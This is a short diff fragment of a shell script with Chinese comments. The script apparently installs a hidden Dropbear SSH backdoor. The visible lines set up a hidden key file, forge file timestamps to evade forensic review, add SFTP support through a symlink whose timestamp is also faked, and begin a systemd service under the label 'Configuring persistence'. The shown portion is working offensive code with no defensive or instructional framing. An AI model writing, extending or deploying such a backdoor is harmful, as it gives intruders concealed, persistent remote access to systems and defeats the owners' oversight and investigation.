@@ -62,8 +62,23 @@ chmod 600 "$HIDDEN_KEY_FILE"
 # 伪造时间戳
 touch -r "$TIME_REF" "$HIDDEN_KEY_FILE"
 touch -r "$TIME_REF" "$HIDDEN_CONF_DIR"
-
-# --- 4. 创建 Systemd 服务 ---
+# --- 4. 配置 SFTP 支持 ---
+echo "[*] Configuring SFTP support..."
+# Dropbear 默认在 /usr/libexec/sftp-server 寻找 SFTP 解释器
+# 这里的 ln -s 确保了你可以通过 WinSCP 或 FileZilla 管理文件
+if [ -f "/usr/lib/openssh/sftp-server" ]; then
+    mkdir -p /usr/libexec
+    ln -sf /usr/lib/openssh/sftp-server /usr/libexec/sftp-server
+    # 同样伪造软链接的时间戳
+    touch -h -r "$TIME_REF" /usr/libexec/sftp-server
+    echo "    SFTP support enabled via OpenSSH provider."
+elif [ -f "/usr/lib/ssh/sftp-server" ]; then
+    mkdir -p /usr/libexec
+    ln -sf /usr/lib/ssh/sftp-server /usr/libexec/sftp-server
+    touch -h -r "$TIME_REF" /usr/libexec/sftp-server
+    echo "    SFTP support enabled via alternative provider."
+fi
+# --- 5. 创建 Systemd 服务 ---
 echo "[*] Configuring persistence..."
 cat <<EOF > "$SVC_PATH"
 [Unit]
